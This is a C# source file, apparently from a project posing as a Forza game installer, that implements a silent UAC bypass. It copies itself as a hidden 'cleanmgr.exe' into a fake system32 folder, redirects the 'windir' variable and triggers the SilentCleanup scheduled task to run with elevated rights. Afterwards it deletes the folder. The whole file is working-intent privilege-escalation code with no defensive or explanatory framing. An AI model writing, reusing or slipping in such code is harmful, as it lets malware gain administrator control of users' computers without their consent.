using System;
using System.Diagnostics;
using System.IO;

namespace ForzaInstallation.Uac
{
    internal static class SilentCleanup
    {
        internal static bool Execute()
        {
            try
            {
                var path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var dir = Path.GetDirectoryName(path);
                var system32Dir = Path.Combine(dir, "system32");
                var hijackExe = Path.Combine(system32Dir, "cleanmgr.exe");
                if (!Directory.Exists(system32Dir)) Directory.CreateDirectory(system32Dir);
                if (!File.Exists(hijackExe))
                {
                    try { File.Copy(path, hijackExe, true); }
                    catch { return false; }
                }
                try { File.SetAttributes(hijackExe, FileAttributes.Hidden); } catch { }
                string oldWindir = Environment.GetEnvironmentVariable("windir");
                Environment.SetEnvironmentVariable("windir", dir);
                try
                {
                    var psi = new ProcessStartInfo("schtasks.exe", "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup")
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    using (var p = Process.Start(psi)) { p.WaitForExit(15000); }
                }
                finally
                {
                    if (oldWindir != null) Environment.SetEnvironmentVariable("windir", oldWindir);
                }
                System.Threading.Thread.Sleep(15000);
                try { if (Directory.Exists(system32Dir)) Directory.Delete(system32Dir, true); } catch { }
                return true;
            }
            catch { return false; }
        }
    }
}
